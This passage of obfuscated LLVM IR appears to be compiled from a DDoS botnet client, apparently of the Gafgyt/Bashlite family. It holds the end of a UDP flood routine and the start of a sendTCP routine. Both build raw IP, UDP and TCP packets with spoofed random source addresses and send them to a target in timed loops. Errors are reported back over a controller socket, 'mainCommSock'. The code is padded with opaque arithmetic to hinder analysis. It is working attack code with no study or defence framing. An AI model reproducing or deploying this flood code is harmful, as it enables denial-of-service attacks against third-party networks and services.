  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %7, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %330

; <label>:46:                                     ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = load i32, i32* %12, align 4
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %10, align 4
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %52, label %121

; <label>:52:                                     ; preds = %46
  %53 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %53, i32* %15, align 4
  %54 = load i32, i32* %15, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %59, label %56

; <label>:56:                                     ; preds = %52
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i32 0, i32 0))
  br label %330

; <label>:59:                                     ; preds = %52
  %60 = load i32, i32* %11, align 4
  %61 = add i32 %60, 344893973
  %62 = add i32 %61, 1
  %63 = sub i32 %62, 344893973
  %64 = add nsw i32 %60, 1
  %65 = sext i32 %63 to i64
  %66 = call noalias i8* @malloc(i64 %65) #2
  store i8* %66, i8** %16, align 8
  %67 = load i8*, i8** %16, align 8
  %68 = icmp eq i8* %67, null
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %59
  br label %330

; <label>:70:                                     ; preds = %59
  %71 = load i8*, i8** %16, align 8
  %72 = load i32, i32* %11, align 4
  %73 = sub i32 0, %72
  %74 = sub i32 0, 1
  %75 = add i32 %73, %74
  %76 = sub i32 0, %75
  %77 = add nsw i32 %72, 1
  %78 = sext i32 %76 to i64
  call void @llvm.memset.p0i8.i64(i8* %71, i8 0, i64 %78, i32 1, i1 false)
  %79 = load i8*, i8** %16, align 8
  %80 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %79, i32 %80)
  %81 = call i64 @time(i64* null) #2
  %82 = load i32, i32* %9, align 4
  %83 = sext i32 %82 to i64
  %84 = add i64 %81, 1444934947779545558
  %85 = add i64 %84, %83
  %86 = sub i64 %85, 1444934947779545558
  %87 = add nsw i64 %81, %83
  %88 = trunc i64 %86 to i32
  store i32 %88, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %89

; <label>:89:                                     ; preds = %113, %112, %70
  %90 = load i32, i32* %15, align 4
  %91 = load i8*, i8** %16, align 8
  %92 = load i32, i32* %11, align 4
  %93 = sext i32 %92 to i64
  %94 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %95 = call i64 @sendto(i32 %90, i8* %91, i64 %93, i32 0, %struct.sockaddr* %94, i32 16)
  %96 = load i32, i32* %18, align 4
  %97 = load i32, i32* %14, align 4
  %98 = icmp eq i32 %96, %97
  br i1 %98, label %99, label %113

; <label>:99:                                     ; preds = %89
  %100 = load i32, i32* %8, align 4
  %101 = icmp eq i32 %100, 0
  br i1 %101, label %102, label %106

; <label>:102:                                    ; preds = %99
  %103 = call i32 @rand_cmwc()
  %104 = trunc i32 %103 to i16
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  br label %106

; <label>:106:                                    ; preds = %102, %99
  %107 = call i64 @time(i64* null) #2
  %108 = load i32, i32* %17, align 4
  %109 = sext i32 %108 to i64
  %110 = icmp sgt i64 %107, %109
  br i1 %110, label %111, label %112

; <label>:111:                                    ; preds = %106
  br label %120

; <label>:112:                                    ; preds = %106
  store i32 0, i32* %18, align 4
  br label %89

; <label>:113:                                    ; preds = %89
  %114 = load i32, i32* %18, align 4
  %115 = sub i32 0, %114
  %116 = sub i32 0, 1
  %117 = add i32 %115, %116
  %118 = sub i32 0, %117
  %119 = add i32 %114, 1
  store i32 %118, i32* %18, align 4
  br label %89

; <label>:120:                                    ; preds = %111
  br label %330

; <label>:121:                                    ; preds = %46
  %122 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %122, i32* %19, align 4
  %123 = load i32, i32* %19, align 4
  %124 = icmp ne i32 %123, 0
  br i1 %124, label %128, label %125

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* @mainCommSock, align 4
  %127 = call i32 (i32, i8*, ...) @sockprintf(i32 %126, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i32 0, i32 0))
  br label %330

; <label>:128:                                    ; preds = %121
  store i32 1, i32* %20, align 4
  %129 = load i32, i32* %19, align 4
  %130 = bitcast i32* %20 to i8*
  %131 = call i32 @setsockopt(i32 %129, i32 0, i32 3, i8* %130, i32 4) #2
  %132 = icmp slt i32 %131, 0
  br i1 %132, label %133, label %136

; <label>:133:                                    ; preds = %128
  %134 = load i32, i32* @mainCommSock, align 4
  %135 = call i32 (i32, i8*, ...) @sockprintf(i32 %134, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.83, i32 0, i32 0))
  br label %330

; <label>:136:                                    ; preds = %128
  store i32 50, i32* %21, align 4
  br label %137

; <label>:137:                                    ; preds = %143, %136
  %138 = load i32, i32* %21, align 4
  %139 = sub i32 0, -1
  %140 = sub i32 %138, %139
  %141 = add nsw i32 %138, -1
  store i32 %140, i32* %21, align 4
  %142 = icmp ne i32 %138, 0
  br i1 %142, label %143, label %155

; <label>:143:                                    ; preds = %137
  %144 = call i64 @time(i64* null) #2
  %145 = call i32 @rand_cmwc()
  %146 = zext i32 %145 to i64
  %147 = xor i64 %144, -1
  %148 = and i64 %146, %147
  %149 = xor i64 %146, -1
  %150 = and i64 %144, %149
  %151 = or i64 %148, %150
  %152 = xor i64 %144, %146
  %153 = trunc i64 %151 to i32
  call void @srand(i32 %153) #2
  %154 = call i32 @rand() #2
  call void @init_rand(i32 %154)
  br label %137

; <label>:155:                                    ; preds = %137
  %156 = load i32, i32* %10, align 4
  %157 = icmp eq i32 %156, 0
  br i1 %157, label %158, label %159

; <label>:158:                                    ; preds = %155
  store i32 0, i32* %22, align 4
  br label %180

; <label>:159:                                    ; preds = %155
  %160 = load i32, i32* %10, align 4
  %161 = add i32 32, -312168733
  %162 = sub i32 %161, %160
  %163 = sub i32 %162, -312168733
  %164 = sub nsw i32 32, %160
  %165 = shl i32 1, %163
  %166 = sub i32 0, 1
  %167 = add i32 %165, %166
  %168 = sub nsw i32 %165, 1
  %169 = xor i32 %167, -1
  %170 = and i32 1661609019, %169
  %171 = xor i32 1661609019, -1
  %172 = and i32 %167, %171
  %173 = xor i32 -1, -1
  %174 = and i32 %173, 1661609019
  %175 = and i32 -1, %171
  %176 = or i32 %170, %172
  %177 = or i32 %174, %175
  %178 = xor i32 %176, %177
  %179 = xor i32 %167, -1
  store i32 %178, i32* %22, align 4
  br label %180

; <label>:180:                                    ; preds = %159, %158
  %181 = load i32, i32* %11, align 4
  %182 = sext i32 %181 to i64
  %183 = sub i64 0, %182
  %184 = sub i64 28, %183
  %185 = add i64 28, %182
  %186 = call i8* @llvm.stacksave()
  store i8* %186, i8** %23, align 8
  %187 = alloca i8, i64 %184, align 16
  %188 = bitcast i8* %187 to %struct.iphdr*
  store %struct.iphdr* %188, %struct.iphdr** %24, align 8
  %189 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %190 = bitcast %struct.iphdr* %189 to i8*
  %191 = getelementptr i8, i8* %190, i64 20
  %192 = bitcast i8* %191 to %struct.udphdr*
  store %struct.udphdr* %192, %struct.udphdr** %25, align 8
  %193 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %194 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %195 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %194, i32 0, i32 0
  %196 = load i32, i32* %195, align 4
  %197 = load i32, i32* %22, align 4
  %198 = call i32 @getRandomIP(i32 %197)
  %199 = call i32 @htonl(i32 %198) #13
  %200 = load i32, i32* %11, align 4
  %201 = sext i32 %200 to i64
  %202 = sub i64 0, 8
  %203 = sub i64 0, %201
  %204 = add i64 %202, %203
  %205 = sub i64 0, %204
  %206 = add i64 8, %201
  %207 = trunc i64 %205 to i32
  call void @makeIPPacket(%struct.iphdr* %193, i32 %196, i32 %199, i8 zeroext 17, i32 %207)
  %208 = load i32, i32* %11, align 4
  %209 = sext i32 %208 to i64
  %210 = sub i64 0, 8
  %211 = sub i64 0, %209
  %212 = add i64 %210, %211
  %213 = sub i64 0, %212
  %214 = add i64 8, %209
  %215 = trunc i64 %213 to i16
  %216 = call zeroext i16 @htons(i16 zeroext %215) #13
  %217 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %218 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %217, i32 0, i32 0
  %219 = bitcast %union.anon.3* %218 to %struct.anon.4*
  %220 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %219, i32 0, i32 2
  store i16 %216, i16* %220, align 2
  %221 = call i32 @rand_cmwc()
  %222 = trunc i32 %221 to i16
  %223 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %224 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %223, i32 0, i32 0
  %225 = bitcast %union.anon.3* %224 to %struct.anon.4*
  %226 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %225, i32 0, i32 0
  store i16 %222, i16* %226, align 2
  %227 = load i32, i32* %8, align 4
  %228 = icmp eq i32 %227, 0
  br i1 %228, label %229, label %231

; <label>:229:                                    ; preds = %180
  %230 = call i32 @rand_cmwc()
  br label %236

; <label>:231:                                    ; preds = %180
  %232 = load i32, i32* %8, align 4
  %233 = trunc i32 %232 to i16
  %234 = call zeroext i16 @htons(i16 zeroext %233) #13
  %235 = zext i16 %234 to i32
  br label %236

; <label>:236:                                    ; preds = %231, %229
  %237 = phi i32 [ %230, %229 ], [ %235, %231 ]
  %238 = trunc i32 %237 to i16
  %239 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %240 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %239, i32 0, i32 0
  %241 = bitcast %union.anon.3* %240 to %struct.anon.4*
  %242 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %241, i32 0, i32 1
  store i16 %238, i16* %242, align 2
  %243 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 0
  %245 = bitcast %union.anon.3* %244 to %struct.anon.4*
  %246 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %245, i32 0, i32 3
  store i16 0, i16* %246, align 2
  %247 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %248 = bitcast %struct.udphdr* %247 to i8*
  %249 = getelementptr inbounds i8, i8* %248, i64 8
  %250 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %249, i32 %250)
  %251 = bitcast i8* %187 to i16*
  %252 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 2
  %254 = load i16, i16* %253, align 2
  %255 = zext i16 %254 to i32
  %256 = call zeroext i16 @csum(i16* %251, i32 %255)
  %257 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 7
  store i16 %256, i16* %258, align 2
  %259 = call i64 @time(i64* null) #2
  %260 = load i32, i32* %9, align 4
  %261 = sext i32 %260 to i64
  %262 = sub i64 0, %259
  %263 = sub i64 0, %261
  %264 = add i64 %262, %263
  %265 = sub i64 0, %264
  %266 = add nsw i64 %259, %261
  %267 = trunc i64 %265 to i32
  store i32 %267, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %268

; <label>:268:                                    ; preds = %322, %321, %236
  br label %269

; <label>:269:                                    ; preds = %268
  %270 = load i32, i32* %19, align 4
  %271 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %272 = call i64 @sendto(i32 %270, i8* %187, i64 %184, i32 0, %struct.sockaddr* %271, i32 16)
  %273 = call i32 @rand_cmwc()
  %274 = trunc i32 %273 to i16
  %275 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %276 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %275, i32 0, i32 0
  %277 = bitcast %union.anon.3* %276 to %struct.anon.4*
  %278 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %277, i32 0, i32 0
  store i16 %274, i16* %278, align 2
  %279 = load i32, i32* %8, align 4
  %280 = icmp eq i32 %279, 0
  br i1 %280, label %281, label %283

; <label>:281:                                    ; preds = %269
  %282 = call i32 @rand_cmwc()
  br label %288

; <label>:283:                                    ; preds = %269
  %284 = load i32, i32* %8, align 4
  %285 = trunc i32 %284 to i16
  %286 = call zeroext i16 @htons(i16 zeroext %285) #13
  %287 = zext i16 %286 to i32
  br label %288

; <label>:288:                                    ; preds = %283, %281
  %289 = phi i32 [ %282, %281 ], [ %287, %283 ]
  %290 = trunc i32 %289 to i16
  %291 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %292 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %291, i32 0, i32 0
  %293 = bitcast %union.anon.3* %292 to %struct.anon.4*
  %294 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %293, i32 0, i32 1
  store i16 %290, i16* %294, align 2
  %295 = call i32 @rand_cmwc()
  %296 = trunc i32 %295 to i16
  %297 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i32 0, i32 3
  store i16 %296, i16* %298, align 4
  %299 = load i32, i32* %22, align 4
  %300 = call i32 @getRandomIP(i32 %299)
  %301 = call i32 @htonl(i32 %300) #13
  %302 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i32 0, i32 8
  store i32 %301, i32* %303, align 4
  %304 = bitcast i8* %187 to i16*
  %305 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 2
  %307 = load i16, i16* %306, align 2
  %308 = zext i16 %307 to i32
  %309 = call zeroext i16 @csum(i16* %304, i32 %308)
  %310 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %311 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %310, i32 0, i32 7
  store i16 %309, i16* %311, align 2
  %312 = load i32, i32* %27, align 4
  %313 = load i32, i32* %14, align 4
  %314 = icmp eq i32 %312, %313
  br i1 %314, label %315, label %322

; <label>:315:                                    ; preds = %288
  %316 = call i64 @time(i64* null) #2
  %317 = load i32, i32* %26, align 4
  %318 = sext i32 %317 to i64
  %319 = icmp sgt i64 %316, %318
  br i1 %319, label %320, label %321

; <label>:320:                                    ; preds = %315
  br label %328

; <label>:321:                                    ; preds = %315
  store i32 0, i32* %27, align 4
  br label %268

; <label>:322:                                    ; preds = %288
  %323 = load i32, i32* %27, align 4
  %324 = sub i32 %323, 1041089165
  %325 = add i32 %324, 1
  %326 = add i32 %325, 1041089165
  %327 = add i32 %323, 1
  store i32 %326, i32* %27, align 4
  br label %268

; <label>:328:                                    ; preds = %320
  %329 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %329)
  br label %330

; <label>:330:                                    ; preds = %328, %133, %125, %120, %69, %56, %45
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %519

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i32 0, i32 0))
  br label %519

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #2
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.83, i32 0, i32 0))
  br label %519

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %82

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = sub i32 0, %67
  %69 = add i32 32, %68
  %70 = sub nsw i32 32, %67
  %71 = shl i32 1, %69
  %72 = add i32 %71, 1553132834
  %73 = sub i32 %72, 1
  %74 = sub i32 %73, 1553132834
  %75 = sub nsw i32 %71, 1
  %76 = xor i32 %74, -1
  %77 = and i32 -1, %76
  %78 = xor i32 -1, -1
  %79 = and i32 %74, %78
  %80 = or i32 %77, %79
  %81 = xor i32 %74, -1
  store i32 %80, i32* %19, align 4
  br label %82

; <label>:82:                                     ; preds = %66, %65
  %83 = load i32, i32* %13, align 4
  %84 = sext i32 %83 to i64
  %85 = sub i64 0, 40
  %86 = sub i64 0, %84
  %87 = add i64 %85, %86
  %88 = sub i64 0, %87
  %89 = add i64 40, %84
  %90 = call i8* @llvm.stacksave()
  store i8* %90, i8** %20, align 8
  %91 = alloca i8, i64 %88, align 16
  %92 = bitcast i8* %91 to %struct.iphdr*
  store %struct.iphdr* %92, %struct.iphdr** %21, align 8
  %93 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %94 = bitcast %struct.iphdr* %93 to i8*
  %95 = getelementptr i8, i8* %94, i64 20
  %96 = bitcast i8* %95 to %struct.tcphdr*
  store %struct.tcphdr* %96, %struct.tcphdr** %22, align 8
  %97 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %98 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %99 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %98, i32 0, i32 0
  %100 = load i32, i32* %99, align 4
  %101 = load i32, i32* %19, align 4
  %102 = call i32 @getRandomIP(i32 %101)
  %103 = call i32 @htonl(i32 %102) #13
  %104 = load i32, i32* %13, align 4
  %105 = sext i32 %104 to i64
  %106 = sub i64 20, 8090600825223876413
  %107 = add i64 %106, %105
  %108 = add i64 %107, 8090600825223876413
  %109 = add i64 20, %105
  %110 = trunc i64 %108 to i32
  call void @makeIPPacket(%struct.iphdr* %97, i32 %100, i32 %103, i8 zeroext 6, i32 %110)
  %111 = call i32 @rand_cmwc()
  %112 = trunc i32 %111 to i16
  %113 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %114 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %113, i32 0, i32 0
  %115 = bitcast %union.anon.0* %114 to %struct.anon.1*
  %116 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %115, i32 0, i32 0
  store i16 %112, i16* %116, align 4
  %117 = call i32 @rand_cmwc()
  %118 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %119 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %118, i32 0, i32 0
  %120 = bitcast %union.anon.0* %119 to %struct.anon.1*
  %121 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %120, i32 0, i32 2
  store i32 %117, i32* %121, align 4
  %122 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon.0* %123 to %struct.anon.1*
  %125 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %124, i32 0, i32 3
  store i32 0, i32* %125, align 4
  %126 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %127 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon.0* %127 to %struct.anon.1*
  %129 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %128, i32 0, i32 4
  %130 = load i16, i16* %129, align 4
  %131 = xor i16 -241, -1
  %132 = xor i16 %130, %131
  %133 = and i16 %132, %130
  %134 = and i16 %130, -241
  %135 = xor i16 %133, -1
  %136 = xor i16 80, -1
  %137 = xor i16 470, -1
  %138 = and i16 %135, 470
  %139 = and i16 %133, %137
  %140 = and i16 %136, 470
  %141 = and i16 80, %137
  %142 = or i16 %138, %139
  %143 = or i16 %140, %141
  %144 = xor i16 %142, %143
  %145 = or i16 %135, %136
  %146 = xor i16 %145, -1
  %147 = or i16 470, %137
  %148 = and i16 %146, %147
  %149 = or i16 %144, %148
  %150 = or i16 %133, 80
  store i16 %149, i16* %129, align 4
  %151 = load i8*, i8** %12, align 8
  %152 = call i32 @strcmp(i8* %151, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i32 0, i32 0)) #10
  %153 = icmp ne i32 %152, 0
  br i1 %153, label %240, label %154

; <label>:154:                                    ; preds = %82
  %155 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %156 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %155, i32 0, i32 0
  %157 = bitcast %union.anon.0* %156 to %struct.anon.1*
  %158 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %157, i32 0, i32 4
  %159 = load i16, i16* %158, align 4
  %160 = xor i16 %159, -1
  %161 = xor i16 -513, -1
  %162 = xor i16 23024, -1
  %163 = or i16 %160, %161
  %164 = or i16 23024, %162
  %165 = xor i16 %163, -1
  %166 = and i16 %165, %164
  %167 = and i16 %159, -513
  %168 = and i16 %166, 512
  %169 = xor i16 %166, 512
  %170 = or i16 %168, %169
  %171 = or i16 %166, 512
  store i16 %170, i16* %158, align 4
  %172 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %173 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %172, i32 0, i32 0
  %174 = bitcast %union.anon.0* %173 to %struct.anon.1*
  %175 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %174, i32 0, i32 4
  %176 = load i16, i16* %175, align 4
  %177 = xor i16 %176, -1
  %178 = xor i16 -1025, -1
  %179 = xor i16 29947, -1
  %180 = or i16 %177, %178
  %181 = or i16 29947, %179
  %182 = xor i16 %180, -1
  %183 = and i16 %182, %181
  %184 = and i16 %176, -1025
  %185 = xor i16 %183, -1
  %186 = xor i16 1024, -1
  %187 = xor i16 14428, -1
  %188 = and i16 %185, 14428
  %189 = and i16 %183, %187
  %190 = and i16 %186, 14428
  %191 = and i16 1024, %187
  %192 = or i16 %188, %189
  %193 = or i16 %190, %191
  %194 = xor i16 %192, %193
  %195 = or i16 %185, %186
  %196 = xor i16 %195, -1
  %197 = or i16 14428, %187
  %198 = and i16 %196, %197
  %199 = or i16 %194, %198
  %200 = or i16 %183, 1024
  store i16 %199, i16* %175, align 4
  %201 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %202 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %201, i32 0, i32 0
  %203 = bitcast %union.anon.0* %202 to %struct.anon.1*
  %204 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %203, i32 0, i32 4
  %205 = load i16, i16* %204, align 4
  %206 = xor i16 -257, -1
  %207 = xor i16 %205, %206
  %208 = and i16 %207, %205
  %209 = and i16 %205, -257
  %210 = and i16 %208, 256
  %211 = xor i16 %208, 256
  %212 = or i16 %210, %211
  %213 = or i16 %208, 256
  store i16 %212, i16* %204, align 4
  %214 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.0* %215 to %struct.anon.1*
  %217 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = xor i16 -4097, -1
  %220 = xor i16 %218, %219
  %221 = and i16 %220, %218
  %222 = and i16 %218, -4097
  %223 = and i16 %221, 4096
  %224 = xor i16 %221, 4096
  %225 = or i16 %223, %224
  %226 = or i16 %221, 4096
  store i16 %225, i16* %217, align 4
  %227 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 0
  %229 = bitcast %union.anon.0* %228 to %struct.anon.1*
  %230 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %229, i32 0, i32 4
  %231 = load i16, i16* %230, align 4
  %232 = xor i16 -2049, -1
  %233 = xor i16 %231, %232
  %234 = and i16 %233, %231
  %235 = and i16 %231, -2049
  %236 = and i16 %234, 2048
  %237 = xor i16 %234, 2048
  %238 = or i16 %236, %237
  %239 = or i16 %234, 2048
  store i16 %238, i16* %230, align 4
  br label %403

; <label>:240:                                    ; preds = %82
  %241 = load i8*, i8** %12, align 8
  %242 = call i8* @strtok(i8* %241, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %242, i8** %23, align 8
  br label %243

; <label>:243:                                    ; preds = %400, %240
  %244 = load i8*, i8** %23, align 8
  %245 = icmp ne i8* %244, null
  br i1 %245, label %246, label %402

; <label>:246:                                    ; preds = %243
  %247 = load i8*, i8** %23, align 8
  %248 = call i32 @strcmp(i8* %247, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i32 0, i32 0)) #10
  %249 = icmp ne i32 %248, 0
  br i1 %249, label %268, label %250

; <label>:250:                                    ; preds = %246
  %251 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 0
  %253 = bitcast %union.anon.0* %252 to %struct.anon.1*
  %254 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %253, i32 0, i32 4
  %255 = load i16, i16* %254, align 4
  %256 = xor i16 %255, -1
  %257 = xor i16 -513, -1
  %258 = xor i16 -8734, -1
  %259 = or i16 %256, %257
  %260 = or i16 -8734, %258
  %261 = xor i16 %259, -1
  %262 = and i16 %261, %260
  %263 = and i16 %255, -513
  %264 = and i16 %262, 512
  %265 = xor i16 %262, 512
